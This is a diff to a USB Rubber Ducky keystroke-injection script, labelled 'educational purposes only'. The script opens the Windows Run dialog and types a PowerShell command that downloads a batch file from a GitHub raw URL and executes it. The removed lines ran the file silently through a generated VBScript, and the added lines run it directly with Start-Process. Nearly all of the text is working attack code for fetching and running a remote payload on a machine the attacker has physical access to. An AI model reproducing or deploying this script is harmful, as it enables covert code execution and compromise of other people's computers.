@@ -1,4 +1,4 @@
-REM This script downloads a batch file and executes it silently using VBScript
+REM This script downloads a batch file and executes it
 REM Educational purposes only. Unauthorized use is illegal.
 
 DELAY 2000
@@ -8,8 +8,8 @@ GUI r
 REM Open the Run dialog (Windows Key + R)
 
 DELAY 500
-STRING powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ZachC137/lxc-template-ubuntu/refs/heads/master/duck.bat' -OutFile '$env:USERPROFILE\Downloads\duck.bat'; echo Set WshShell = CreateObject('WScript.Shell') > '$env:USERPROFILE\Downloads\run.vbs'; echo WshShell.Run '$env:USERPROFILE\Downloads\duck.bat', 0, False >> '$env:USERPROFILE\Downloads\run.vbs'; cscript //nologo '$env:USERPROFILE\Downloads\run.vbs'"
-REM Use PowerShell to download the batch file and create a VBScript to run it silently
+STRING powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ZachC137/lxc-template-ubuntu/refs/heads/master/duck.bat' -OutFile '$env:USERPROFILE\Downloads\duck.bat'; Start-Process '$env:USERPROFILE\Downloads\duck.bat'"
+REM Use PowerShell to download the batch file and execute it
 
 ENTER
 REM Execute the command
